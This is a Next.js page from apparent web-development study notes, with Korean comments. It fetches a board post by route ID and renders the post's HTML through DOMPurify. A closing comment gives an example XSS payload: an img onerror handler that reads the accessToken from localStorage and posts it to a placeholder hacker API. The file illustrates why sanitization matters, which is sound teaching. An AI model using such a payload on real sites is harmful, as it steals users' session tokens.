// next에서 [대괄호]를 다이나믹 라우팅으로 인식하기때문에 무조건 외워야함

import { gql, useQuery } from "@apollo/client";
import { useRouter } from "next/router";
import Dompurify from "dompurify";

const FETCH_BOARD = gql`
  query typeSetting($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutedPage() {
  const router = useRouter();

  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: router.query.id },
  });

  console.log(data);

  return (
    <>
      {/* <div>{router.query.number}번 페이지로 이동이 완료되었습니다.</div> */}
      <div>작성자: {data?.fetchBoard.writer}</div>
      <div>제목: {data?.fetchBoard.title}</div>
      {/* <div>내용: {data?.fetchBoard.contents}</div> */}
      {/* 태그 자체를 실행시키고 싶을때 */}
      {typeof window !== "undefined" && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard.contents),
          }}
        />
      )}
    </>
  );
}

// playgroud XSS 공격
/* 
  <img src="#" onerror="
	const aaa = localStorage.getItem('accessToken');
	axios.post(해커API주소, {accessToken = aaa});
" /> 
*/
